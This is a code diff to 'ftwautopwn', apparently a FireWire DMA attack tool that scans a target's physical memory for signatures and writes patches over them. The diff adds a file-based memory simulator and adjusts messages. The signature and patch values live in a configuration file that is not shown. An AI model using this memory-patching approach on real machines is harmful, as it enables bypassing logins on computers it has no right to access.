@@ -8,12 +8,70 @@ from forensic1394 import Bus
 from ftwautopwn.util import print_msg, Context
 from time import sleep
 import sys
-from ftwautopwn.method import Method
-from ftwautopwn.patch import Patch
+import math
 
 ctx = Context()
 
+class Method(object):
+    '''
+    classdocs
+    '''
+
+
+    def __init__(self, number, desc, patches):
+        '''
+        Constructor
+        '''
+        self.number = number
+        self.desc = desc
+        self.patches = patches
+        
+
+class Patch:
+    '''
+    classdocs
+    '''
+
+
+    def __init__(self, sig, patch, offset):
+        '''
+        Constructor
+        '''
+        self.sig = sig
+        self.patch = patch
+        self.offset = offset
+
+class MemoryFile:
+    '''
+    classdocs
+    '''
+
+    def __init__(self, file_name, pagesize):
+        '''
+        Constructor
+        '''
+        self.file = open(file_name, mode='rb')
+        self.pagesize = pagesize
+    
+    def read(self, addr, numb, buf=None):
+        self.file.seek(addr)
+        return self.file.read(numb)  
+    
+    def readv(self, req):
+        for r in req:
+            #print(str(r[0]) + ' ' + str(r[1]))
+            self.file.seek(r[0])
+            yield (r[0], self.file.read(r[1]))
+    
+    def write(self, addr, buf):
+        '''
+        For now, dummy method in order to simulate a write
+        '''
+        pass
+        
+
 def run(context):
+    global ctx
     ctx = context
     config = ctx.config
     encoding = ctx.encoding
@@ -29,8 +87,9 @@ def run(context):
 
         if (len(sigs) != len(patches) or \
             len(patches) != len(pageoffsets)):
-            print_msg('!', 'Uneven number of sigs, patches and page ' \
-                      'offsets in section %s of configuration file.' % method_name)
+            print_msg('!', 'Uneven number of signatures, patches and page ' 
+                      'offsets in section %s of configuration file.' 
+                      % method_name)
             sys.exit(1)
 
         # Populate patches for the given method
@@ -53,16 +112,19 @@ def run(context):
     print_msg('+', 'You have selected: ' + selected_target)
     print_msg('|', 'Using signature: ' + hexlify(sigs).decode(encoding))
     print_msg('|', 'Using patch: ' + hexlify(patch).decode(encoding))
-    print_msg('L', 'Using offset: ' + str(off))
+    print_msg('|', 'Using offset: ' + str(off))
     
     d = None
-    d = initialize_fw(d)
+    if ctx.file_mode:
+        d = MemoryFile(ctx.file_name, ctx.PAGESIZE)
+    else:
+        d = initialize_fw(d)
     
     try:
         # Find
         addr = findsig(d, sigs, off)
         print()
-        print_msg('+', 'Signature found at %d.' % addr)
+        print_msg('+', 'Signature found at 0x%x.' % addr)
         # Patch and verify
         d.write(addr, patch)
         assert d.read(addr, len(patch)) == patch
@@ -120,8 +182,9 @@ def findsig(d, sig, off):
         r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
         for caddr, cand  in d.readv(r):
             if cand == sig: return caddr
-        mibaddr = addr / (1024 * 1024)
-        sys.stdout.write('[+] Searching for signature, %4d MiB so far...\r' % \
-                         mibaddr)
+        mibaddr = math.floor(addr / (1024 * 1024))
+        sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far. ' \
+                         'Data read: {1}'.format(mibaddr, hexlify(cand).decode(ctx.encoding)))
+        sys.stdout.write('\r')
         sys.stdout.flush()
         addr += ctx.PAGESIZE * 128  
